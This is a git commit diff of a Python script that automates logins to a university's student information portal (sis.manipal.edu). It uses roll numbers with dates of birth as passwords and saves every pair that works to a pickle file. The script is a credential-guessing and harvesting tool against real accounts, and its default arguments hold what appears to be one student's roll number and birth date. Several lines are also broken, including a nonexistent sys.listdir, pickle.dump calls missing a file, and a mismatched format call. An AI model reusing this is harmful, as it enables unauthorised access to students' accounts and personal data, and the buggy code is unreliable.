ca2ae75c2fa58a9054c35dd93c5fc5073283b9d8
Sidharth R <tornadoalert@gmail.com>
2017-01-27 17:56:08 +0530

    refinements

--- loginchecker.py
+++ loginchecker.py
@@ -1,7 +1,19 @@
 import robobrowser
 import requests
 import shutil
+import pickle, sys
 from PIL import Image
+
+def load():
+    if not 'data.pkl' in sys.listdir():
+        obj = []
+        with open('data.pkl','wb') as f:
+            pickle.dump(obj)
+    with open('data.pkl','rb') as f:
+        return pickle.load(f)
+def write(obj):
+    with open('data.pkl','wb') as f:
+        pickle.dump(obj)
 def open_page():
     """Opens up the sis page and returns browser object"""
     br = robobrowser.RoboBrowser()
@@ -9,22 +21,23 @@ def open_page():
     return br
 def login(uname = '150101312',passw = '08/09/1997'):
     """Attempts login"""
-    print("[+] Opening Page...")
+    threadno = "{}  {}".format(uname + passw)
+    print("[+] {} Opening Page...".format(threadno))
     br = open_page()
     form = br.get_forms()[0] #Supress warning
     images = br.find_all('img')
     cap =images[2]['src']
     url = 'https://sis.manipal.edu/'
     cap_url = url + cap
-    print("[+] Fetching Captcha")
-    write_file(cap_url,'captcha.jpg')
+    print("[+] {} Fetching Captcha".format(threadno))
+    write_file(cap_url,'{}.jpg'.format(threadno))
     captcha_ans = manual_captcha()
     #captcha_ans = ocr('captcha.jpg')
     form['txtroll'] = uname
     form['txtdob'] = passw
     form['txtCaptcha'] = captcha_ans
     form.serialize()
-    print("[+] Attempting login")
+    print("[+] {} Attempting login".format(threadno))
     br.submit_form(form)
     page = br.open('https://sis.manipal.edu/geninfo.aspx')
     tables = br.find_all('table')
@@ -63,9 +76,12 @@ def manual_captcha():
 def login_check(roll,dob):
     _,value = login(roll,dob)
     if len(value) == 0:
-        print("[-]")
+        print("[-] {}  {}".format(roll,dob))
     else:
-        print("[+] Recorded login!")
+        print("[+] {}  {} Recorded login!!!!!!!!!!!!!".format(roll,dob))
+        creds = load()
+        creds.append((roll,dob))
+        write(creds)
         for i in value:
             print(i)
 
